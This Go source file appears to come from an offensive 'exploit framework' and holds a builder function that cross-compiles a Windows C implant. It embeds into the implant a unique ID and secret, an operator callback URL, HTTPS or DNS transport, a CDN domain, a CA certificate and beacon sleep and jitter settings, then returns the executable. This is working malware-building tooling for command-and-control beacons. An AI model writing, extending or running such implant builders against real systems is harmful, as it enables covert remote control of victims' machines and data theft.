package builder

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
)

// BuildC compiles the C implant via cimplant/Makefile (mingw cross-compile).
func BuildC(req *BuildRequest) (*BuildResult, error) {
	if req.OS != "windows" {
		return nil, fmt.Errorf("C implant only supports windows (got %s)", req.OS)
	}
	if req.Arch != "amd64" {
		return nil, fmt.Errorf("C implant only supports amd64 (got %s)", req.Arch)
	}
	if req.Format != FormatEXE {
		return nil, fmt.Errorf("C implant only supports exe format (got %s)", req.Format)
	}

	implantID, err := zcrypto.RandomID(16)
	if err != nil {
		return nil, fmt.Errorf("generate implant ID: %w", err)
	}

	// Always generate a unique per-implant secret (do not reuse fleet ImplantSecret).
	secretBytes, err := zcrypto.RandomBytes(32)
	if err != nil {
		return nil, fmt.Errorf("generate secret: %w", err)
	}
	secret := hex.EncodeToString(secretBytes)
	req.ImplantSecret = secret

	callbackURL := "https://127.0.0.1:443"
	if len(req.Callbacks) > 0 {
		callbackURL = req.Callbacks[0]
	}

	if _, err := url.ParseRequestURI(callbackURL); err != nil {
		return nil, fmt.Errorf("invalid callback URL: %w", err)
	}
	if err := validateLdflagValue(callbackURL, "callbackURL"); err != nil {
		return nil, err
	}
	if req.CDNDomain != "" {
		if !validDomainRe.MatchString(req.CDNDomain) {
			return nil, fmt.Errorf("invalid CDN domain: %s", req.CDNDomain)
		}
		if err := validateLdflagValue(req.CDNDomain, "CDNDomain"); err != nil {
			return nil, err
		}
	}

	transport := req.Transport
	if transport == "" {
		transport = "https"
	}
	if transport == "dns" {
		if req.DNSDomain == "" {
			return nil, fmt.Errorf("dns_domain required when transport=dns")
		}
		if !validDomainRe.MatchString(strings.TrimSuffix(req.DNSDomain, ".")) {
			return nil, fmt.Errorf("invalid DNS domain: %s", req.DNSDomain)
		}
		if err := validateLdflagValue(req.DNSDomain, "DNSDomain"); err != nil {
			return nil, err
		}
		if req.DNSServer != "" {
			if err := validateLdflagValue(req.DNSServer, "DNSServer"); err != nil {
				return nil, err
			}
		}
	}

	caCertB64 := ""
	if req.CACertPath != "" {
		if err := validateLdflagValue(req.CACertPath, "CACertPath"); err != nil {
			return nil, err
		}
		caPEM, err := os.ReadFile(req.CACertPath)
		if err != nil {
			return nil, fmt.Errorf("read CA cert: %w", err)
		}
		block, _ := pem.Decode(caPEM)
		if block == nil || block.Type != "CERTIFICATE" {
			return nil, fmt.Errorf("decode CA cert PEM")
		}
		caCertB64 = base64.StdEncoding.EncodeToString(block.Bytes)
	}

	projectRoot := req.ProjectRoot
	if projectRoot == "" {
		projectRoot = "."
	}
	absRoot, err := filepath.Abs(projectRoot)
	if err != nil {
		return nil, fmt.Errorf("resolve project root: %w", err)
	}
	if _, err := os.Stat(filepath.Join(absRoot, "cimplant", "Makefile")); err != nil {
		return nil, fmt.Errorf("cimplant Makefile not found under %s", absRoot)
	}

	if _, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
		return nil, fmt.Errorf("C implant build requires mingw32 toolchain: x86_64-w64-mingw32-gcc not found in PATH")
	}

	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()

	cimplantDir := filepath.Join(absRoot, "cimplant")
	buildDir := filepath.Join(absRoot, "build")
	outputFile := filepath.Join(buildDir, "implant_c.exe")

	cmd := exec.CommandContext(ctx, "make", "all",
		fmt.Sprintf("IMPLANT_ID=%s", implantID),
		fmt.Sprintf("IMPLANT_SECRET=%s", secret),
		fmt.Sprintf("CALLBACK_URL=%s", callbackURL),
		fmt.Sprintf("SLEEP_MS=%d", req.SleepMs),
		fmt.Sprintf("JITTER_PCT=%d", req.JitterPct),
		fmt.Sprintf("TRANSPORT_TYPE=%s", transport),
		fmt.Sprintf("DNS_DOMAIN=%s", req.DNSDomain),
		fmt.Sprintf("DNS_SERVER=%s", req.DNSServer),
		fmt.Sprintf("CDN_DOMAIN=%s", req.CDNDomain),
		fmt.Sprintf("CA_CERT_PEM=%s", caCertB64),
	)
	cmd.Dir = cimplantDir
	toolchainBin := filepath.Join(absRoot, ".toolchain", "llvm-mingw", "bin")
	if _, err := os.Stat(filepath.Join(toolchainBin, "x86_64-w64-mingw32-gcc")); err != nil {
		toolchainBin = filepath.Join(absRoot, ".toolchain", "mingw-root", "usr", "bin")
	}
	cmd.Env = append(os.Environ(), "CC=x86_64-w64-mingw32-gcc", "PATH="+toolchainBin+string(os.PathListSeparator)+os.Getenv("PATH"))

	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("c implant build failed: %w\n%s", err, string(output))
	}

	binary, err := os.ReadFile(outputFile)
	if err != nil {
		return nil, fmt.Errorf("read C implant output: %w", err)
	}

	buildID, err := zcrypto.RandomID(8)
	if err != nil {
		return nil, fmt.Errorf("generate build ID: %w", err)
	}

	return &BuildResult{
		BuildID:       buildID,
		Binary:        binary,
		Filename:      fmt.Sprintf("implant-%s.exe", buildID),
		Format:        FormatEXE,
		SizeBytes:     int64(len(binary)),
		ImplantID:     implantID,
		ImplantSecret: secret,
	}, nil
}
